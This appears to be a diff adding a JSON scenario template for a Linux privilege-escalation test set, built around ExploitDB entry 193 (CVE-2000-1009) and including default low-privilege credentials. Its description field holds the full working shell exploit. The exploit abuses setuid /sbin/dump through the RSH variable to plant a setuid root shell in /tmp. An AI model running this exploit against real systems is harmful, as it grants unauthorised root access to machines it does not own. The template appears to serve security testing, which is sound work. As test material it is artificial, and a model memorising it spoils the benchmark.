@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_193",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: dump 0.4b15 - Local Privilege Escalation (OSVDB-13747;CVE-2000-1009)\n\nExploit source code (193.sh):\n```\n#!/bin/sh\n\n# Redhat 6.2 dump command executes external program\n# with suid priviledge.\n# Discovered by Mat <mat@hacksware.com>\n# Written for and by a scriptkid Tasc ;P\n# Remember, there's no cure for BSE\n\necho \"dump-0.4b15 root exploit\"\necho \"Discovered by Mat <mat@hacksware.com>\"\necho \"-------------------------------------\"\necho\nDUMP=/sbin/dump\nif [ ! -u $DUMP ]; then\n  echo \"$DUMP is NOT setuid on this system or does not exist at all!\"\n  echo\n  exit 0\nfi\nexport TAPE=iamlame:iamlame\nexport RSH=/tmp/rsh\ncat >/tmp/rsh <<__eof__\n#!/bin/sh\ncp /bin/sh /tmp/sush\nchmod 4755 /tmp/sush\n}\n__eof__\nchmod 755 /tmp/rsh\n/sbin/dump -0 /\necho\necho \"Waiting for rootshell .... 5 seconds....\"\nsleep 5\n/tmp/sush\nid\n\n\n# milw0rm.com [2000-11-19]\n```",
+  "cve": "OSVDB-13747;CVE-2000-1009",
+  "exploitdb_id": "193",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_193",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
